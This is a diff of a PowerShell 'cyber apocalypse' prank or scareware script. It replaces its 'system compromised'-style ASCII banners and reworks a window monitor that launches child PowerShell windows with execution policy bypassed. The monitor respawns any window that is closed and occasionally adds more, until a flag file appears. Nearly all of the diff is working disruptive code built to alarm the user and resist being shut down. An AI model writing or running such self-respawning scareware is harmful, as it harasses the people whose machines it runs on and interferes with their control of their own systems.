@@ -15,33 +15,32 @@ $global:processTracker = "$env:TEMP\cyberApocalypseProcs.txt"
 # Multiple ASCII Banners
 $banners = @(
 @"
-   ██████╗██╗   ██╗██████╗ ███████╗██████╗      █████╗ ██████╗  ██████╗  ██████╗ █████╗ ██╗  ██╗   ██╗██████╗ ███████╗███████╗
-  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗██║  ╚██╗ ██╔╝██╔══██╗██╔════╝██╔════╝
-  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ███████║██████╔╝██║   ██║██║     ███████║██║   ╚████╔╝ ██████╔╝███████╗█████╗
-  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██╔══██║██╔═══╝ ██║   ██║██║     ██╔══██║██║    ╚██╔╝  ██╔═══╝ ╚════██║██╔══╝
-  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██║  ██║██║     ╚██████╔╝╚██████╗██║  ██║███████╗██║   ██║     ███████║███████╗
-   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝     ╚══════╝╚══════╝
+   ▄████████ ▀████    ▐████▀ ▀█████████▄   ▄████████    ▄████████
+  ███    ███   ███▌   ████▀    ███    ███ ███    ███   ███    ███
+  ███    █▀     ███  ▐███      ███    ███ ███    █▀    ███    ███
+  ███           ▀███▄███▀      ███    ███ ███         ▄███▄▄▄▄██▀
+  ███           ████▀██▄       ███    ███ ███        ▀▀███▀▀▀▀▀
+  ███    █▄    ▐███  ▀███      ███    ███ ███    █▄  ▀███████████
+  ███    ███   ███    ███▄     ███   ▄███ ███    ███   ███    ███
+  ████████▀   ████    ████   ▄█████████▀  ████████▀    ███    ███
+                                                       ███    ███
 "@,
 @"
-    ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗     ██████╗ ██████╗ ███╗   ███╗██████╗ ██████╗  ██████╗ ███╗   ███╗██╗███████╗███████╗██████╗
-    ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║    ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██║██╔════╝██╔════╝██╔══██╗
-    ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║    ██║     ██║   ██║██╔████╔██║██████╔╝██████╔╝██║   ██║██╔████╔██║██║███████╗█████╗  ██║  ██║
-    ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║    ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══██╗██║   ██║██║╚██╔╝██║██║╚════██║██╔══╝  ██║  ██║
-    ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║███████║███████╗██████╔╝
-    ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚═════╝
+  .▄▄ ·  ▄▄▄· ▄▄▄█    ▄▄▄▄▄▄▄▄ .·▄▄▄▄
+  ▐█ ▀. ▐█ ▀█ ▀▀▀·    •██  ▀▄.▀·██▪ ██
+  ▄▀▀▀█▄▄█▀▀█ ▐█▀·     ▐█.▪▐▀▀▪▄▐█· ▐█▌
+  ▐█▄▪▐█▐█ ▪▐▌▐█▪· ▄   ▐█▌·▐█▄▄▌██. ██
+   ▀▀▀▀  ▀  ▀ ▀▀▀  ▀   ▀▀▀  ▀T E R M I N A T E D
 "@,
 @"
-    ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄
-   ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌     ▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
-   ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌   ▐░▐░▌     ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀
-   ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌▐░▌ ▐░▌▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌
-   ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▐░▌ ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄
-   ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌▐░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌     ▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
-   ▐░▌       ▐░▌▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌   ▀   ▐░▌     ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀
-   ▐░▌       ▐░▌▐░▌     ▐░▌  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌
-   ▐░█▄▄▄▄▄▄▄█░▌▐░▌      ▐░▌ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌     ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄
-   ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌     ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
-    ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀       ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀
+   _______           _______  _______  _______
+  (  ____ \|\     /|(  ___  )(  ___  )(  ____ \
+  | (    \/| )   ( || (   ) || (   ) || (    \/
+  | |      | (___) || (___) || |   | || (_____
+  | |      |  ___  ||  ___  || |   | |(_____  )
+  | |      | (   ) || (   ) || |   | |      ) |
+  | (____/\| )   ( || )   ( || (___) |/\____) |
+  (_______/|/     \||/     \|(_______)\_______)
 "@
 )
 
@@ -119,34 +118,43 @@ function Start-WindowMonitor {
     $scriptBlock = {
         param($scriptPath, $flagFile, $procTracker, $currentPid, $gen)
 
-        $spawnCount = 4
+        # Persistence Configuration
+        $maxChildren = 2  # Keep 3 windows open per parent
         $children = @()
 
-        # Initial spawn
-        for ($i = 0; $i -lt $spawnCount; $i++) {
-            Start-Sleep -Milliseconds 500
+        # Initial spawn - staggered
+        for ($i = 0; $i -lt $maxChildren; $i++) {
             if (Test-Path $flagFile) { break }
+            Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 800)
             $proc = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
             $children += $proc
         }
 
         # Monitor and respawn
         while (-not (Test-Path $flagFile)) {
-            Start-Sleep -Seconds 2
+            Start-Sleep -Seconds 1
 
-            foreach ($proc in $children) {
-                if ($proc.HasExited -and -not (Test-Path $flagFile)) {
-                    # Respawn!
-                    $newProc = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
+            # Check for dead children
+            $deadChildren = $children | Where-Object { $_.HasExited }
+
+            if ($deadChildren) {
+                foreach ($proc in $deadChildren) {
+                    # Remove dead child from list
                     $children = $children | Where-Object { $_.Id -ne $proc.Id }
-                    $children += $newProc
+
+                    if (-not (Test-Path $flagFile)) {
+                        # Respawn with delay
+                        Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 1500)
+                        $newProc = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
+                        $children += $newProc
+                    }
                 }
             }
 
-            # Add random additional window occasionally for chaos
-            if ((Get-Random -Minimum 1 -Maximum 10) -eq 5 -and $children.Count -lt 8) {
-                $newProc = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
-                $children += $newProc
+            # Occasional "Reinforcement" (rarely add a new one if we are low)
+            if ($children.Count -lt $maxChildren -and (Get-Random -Max 20) -eq 0) {
+                 $newProc = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
+                 $children += $newProc
             }
         }
 
